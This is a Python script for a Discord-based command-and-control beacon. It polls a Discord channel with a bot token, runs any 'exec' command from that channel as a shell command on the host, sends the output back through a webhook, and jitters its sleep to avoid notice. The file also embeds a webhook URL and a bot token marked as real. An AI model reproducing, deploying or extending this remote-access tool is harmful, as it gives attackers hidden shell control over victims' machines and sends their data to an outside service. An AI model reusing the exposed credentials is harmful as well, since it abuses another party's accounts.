import os
import sys
import time
import json
import random
import subprocess
import urllib.request
import urllib.error

# Discord API Details
# [REAL TOKENS - DO NOT LEAK]
WEBHOOK_URL = "https://discord.com/api/webhooks/1494406576662909091/D7saO5wPoWqP1lP0QdN4EzCX5DfaHnZVP4dXrTOS1-FlEM1vU_zHHochrZe_FVXMCAn1"
BOT_TOKEN = "MTQ5NDQwNjA0NjAxNjYwMjE0Mw.GEIWLD.jq3LQoPO8cPPil_E78jU-9cQx6377xGtxIUU80"
CHANNEL_ID = "1494405781213417644"

def send_discord_message(message):
    data = json.dumps({"content": message}).encode('utf-8')
    req = urllib.request.Request(WEBHOOK_URL, data=data, headers={'Content-Type': 'application/json'})
    try:
        urllib.request.urlopen(req)
        return True
    except urllib.error.URLError:
        return False

def poll_discord_commands(last_message_id):
    url = f"https://discord.com/api/v10/channels/{CHANNEL_ID}/messages?limit=1"
    if last_message_id:
        url += f"&after={last_message_id}"
    
    req = urllib.request.Request(url, headers={'Authorization': f'Bot {BOT_TOKEN}'})
    try:
        with urllib.request.urlopen(req) as response:
            res_data = response.read().decode('utf-8')
            messages = json.loads(res_data)
            
            if messages:
                msg = messages[0]
                return msg.get('content', ''), msg.get('id', '')
    except urllib.error.URLError:
        pass
    return "", last_message_id

def execute_command(cmd):
    if not cmd:
        return
    
    if cmd == "ping":
        send_discord_message("pong")
    elif cmd.startswith("exec "):
        sys_cmd = cmd[5:]
        try:
            # Execute command and capture output
            result = subprocess.run(sys_cmd, shell=True, capture_output=True, text=True, timeout=30)
            output = result.stdout if result.stdout else result.stderr
            if not output:
                output = "Command executed successfully with no output."
            
            # Discord message limit is 2000 chars
            if len(output) > 1900:
                output = output[:1900] + "\n...[Output Truncated]"
                
            send_discord_message(f"```\n{output}\n```")
        except Exception as e:
            send_discord_message(f"Error executing command: {str(e)}")
    elif cmd == "exit":
        send_discord_message("Shutting down Python beacon.")
        sys.exit(0)

def calculate_jitter(base_sleep_ms, jitter_percentage):
    jitter_amount = int(base_sleep_ms * (jitter_percentage / 100.0))
    jitter = random.randint(-jitter_amount, jitter_amount)
    return (base_sleep_ms + jitter) / 1000.0 # Convert to seconds for time.sleep()

def main():
    print("[*] Python Discord C2 Beacon Online (Fallback Mode).")
    send_discord_message("[*] Python Discord C2 Beacon Online (Fallback Mode).")

    base_sleep_ms = 5000 # 5 seconds
    jitter_percent = 20  # 20% jitter
    last_msg_id = ""

    while True:
        cmd, new_msg_id = poll_discord_commands(last_msg_id)
        
        if cmd and new_msg_id != last_msg_id:
            last_msg_id = new_msg_id
            execute_command(cmd)
            
        sleep_time = calculate_jitter(base_sleep_ms, jitter_percent)
        time.sleep(sleep_time)

if __name__ == "__main__":
    main()
